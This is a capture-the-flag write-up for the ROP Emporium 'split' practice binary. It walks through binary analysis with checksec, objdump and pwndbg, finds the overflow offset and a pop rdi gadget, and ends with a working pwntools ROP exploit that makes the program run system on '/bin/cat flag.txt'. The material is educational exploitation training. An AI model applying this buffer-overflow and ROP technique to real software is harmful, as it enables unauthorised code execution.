First of all, use checksec to get some binary information

```shell
[marco@marco-pc Downloads]$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cbc19d1114b70bce2305f7ded9e7dd4d2e28069, not stripped
[marco@marco-pc Downloads]$ checksec --file=split
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols     No	0		3	split
```

The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some information from symbol table
```shell
[marco@marco-pc Downloads]$ objdump -t split
...
00000000004007b5 l     F .text	0000000000000052              pwnme
...
0000000000400807 l     F .text	0000000000000011              usefulFunction
...
0000000000601060 g     O .data	000000000000001a              usefulString
```

There are some interesting stuff:
- pwnme, which is called from main, print some strings and get an input;
- usefulFunction perfom a system comand "/bin/ls"
- usefulString is "/bin/cat flag.txt"
```gdb
pwndbg> disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0000000000400807 <+0>:	push   rbp
   0x0000000000400808 <+1>:	mov    rbp,rsp
   0x000000000040080b <+4>:	mov    edi,0x4008ff
   0x0000000000400810 <+9>:	call   0x4005e0 <system@plt>
   0x0000000000400815 <+14>:	nop
   0x0000000000400816 <+15>:	pop    rbp
   0x0000000000400817 <+16>:	ret    
End of assembler dump.
pwndbg> x/s 0x4008ff
0x4008ff:	"/bin/ls"
pwndbg> x/s 0x0000000000601060
0x601060 <usefulString>:	"/bin/cat flag.txt"
```

With a buffer overflow we can control the EIP. Jumping at system@plt with usefulString as parameter, we can read the flag.
Let's find out how many bytes we need to fill until EIP
```gdb
pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

...

split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.

...

RBP  0x6161616a61616169 ('iaaajaaa')

...

pwndbg> cyclic -l 'iaaa'
32
```

Last thing we need is a *`pop rdi; ret`* gadget to pass the string as argument

```shell
[marco@marco-pc Downloads]$ ROPgadget --binary /home/marco/Downloads/split > /home/marco/Downloads/gadget
[marco@marco-pc Downloads]$ cat /home/marco/Downloads/gadget | grep "pop rdi"
0x0000000000400883 : pop rdi ; ret
```

Final exploit:
NOTE: Remember to add 8 at 32 ( 32 buffer + 8 RBP ).
```python
from pwn import *
 
system_addr = 0x4005e0
string_addr = 0x0000000000601060
pop_rdi = 0x0000000000400883

expl = ("A"*40).encode()
expl += p64(pop_rdi)
expl += p64(string_addr)
expl += p64(system_addr)

p = process('./split')
p.recvuntil('>')
p.sendline(expl)
p.interactive()
```
